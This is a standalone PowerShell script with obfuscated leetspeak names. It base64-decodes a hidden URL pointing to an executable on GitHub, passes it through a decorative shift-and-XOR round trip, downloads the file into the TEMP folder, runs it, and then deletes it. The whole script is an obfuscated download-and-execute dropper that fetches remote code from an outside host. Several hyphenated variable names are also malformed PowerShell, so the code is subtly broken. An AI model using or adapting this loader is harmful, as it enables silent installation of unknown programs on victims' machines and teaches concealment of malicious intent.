# Base64 encoded URL
$asdfewvvbqrrqwe = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"

# Function to decode Base64 string
function D3c0d3-B4s364-57r1ng {
    param (
        [string]$b4s364-57r1ng
    )
    try {
        return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b4s364-57r1ng))
    } catch {
        Write-Error "Failed to decode Base64 string: $_"
        return $null
    }
}

# Decode the URL
$d3c0d3d-uRl = D3c0d3-B4s364-57r1ng -b4s364-57r1ng $asdfewvvbqrrqwe

# Function to download a file
function D0wnl0ad-F1l3 {
    param (
        [string]$uRl
    )
    try {
        $oUtpU7-P4th = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($uRl))
        $w3bCl13nt = New-Object System.Net.WebClient
        $w3bCl13nt.DownloadFile($uRl, $oUtpU7-P4th)
        return $oUtpU7-P4th
    } catch {
        Write-Error "Failed to download file from $uRl: $_"
        return $null
    }
}

# Function to execute a file
function Ex3cU73-F1l3 {
    param (
        [string]$f1l3-P4th
    )
    try {
        Start-Process -FilePath $f1l3-P4th -NoNewWindow -Wait
    } catch {
        Write-Error "Failed to execute file at $f1l3-P4th: $_"
    }
}

# Function to shift characters in a string (encrypt)
function E6crypt-57r1ng {
    param (
        [string]$1nput
    )
    try {
        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($1nput)
        $3nc0d3d-57r1ng = ""
        foreach ($ch4r in $ch4rs) {
            $3nc0d3d-57r1ng += [char]($ch4r + 1)
        }
        return $3nc0d3d-57r1ng
    } catch {
        Write-Error "Failed to encrypt string: $_"
        return $null
    }
}

# Function to shift characters in a string (decrypt)
function D3crypt-57r1ng {
    param (
        [string]$1nput
    )
    try {
        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($1nput)
        $d3c0d3d-57r1ng = ""
        foreach ($ch4r in $ch4rs) {
            $d3c0d3d-57r1ng += [char]($ch4r - 1)
        }
        return $d3c0d3d-57r1ng
    } catch {
        Write-Error "Failed to decrypt string: $_"
        return $null
    }
}

# Function to XOR encode a string
function X0r-3nC0d3 {
    param (
        [string]$1nput,
        [int]$k3y
    )
    try {
        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($1nput)
        $3nc0d3d-57r1ng = ""
        for ($i = 0; $i -lt $ch4rs.Length; $i++) {
            $3nc0d3d-57r1ng += [char]($ch4rs[$i] -bxor $k3y)
        }
        return $3nc0d3d-57r1ng
    } catch {
        Write-Error "Failed to XOR encode string: $_"
        return $null
    }
}

# Function to XOR decode a string
function X0r-D3c0d3 {
    param (
        [string]$1nput,
        [int]$k3y
    )
    try {
        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($1nput)
        $d3c0d3d-57r1ng = ""
        for ($i = 0; $i -lt $ch4rs.Length; $i++) {
            $d3c0d3d-57r1ng += [char]($ch4rs[$i] -bxor $k3y)
        }
        return $d3c0d3d-57r1ng
    } catch {
        Write-Error "Failed to XOR decode string: $_"
        return $null
    }
}

# Encrypt the URL
$3nc0d3d-uRl = E6crypt-57r1ng -1nput $d3c0d3d-uRl

# XOR encode the encrypted URL
$x0r3nc0d3d-uRl = X0r-3nC0d3 -1nput $3nc0d3d-uRl -k3y 5

# XOR decode the encrypted URL
$x0r3d3c0d3d-uRl = X0r-D3c0d3 -1nput $x0r3nc0d3d-uRl -k3y 5

# Decrypt the URL
$d3c0d3d-uRl = D3crypt-57r1ng -1nput $x0r3d3c0d3d-uRl

# Download the file
$f1l3-P4th = D0wnl0ad-F1l3 -uRl $d3c0d3d-uRl

# Check if the file was downloaded successfully
if ($f1l3-P4th) {
    # Execute the file using Invoke-Expression
    Invoke-Expression "Ex3cU73-F1l3 -f1l3-P4th `"$f1l3-P4th`""

    # Remove the file after execution
    Remove-Item -Path $f1l3-P4th
}
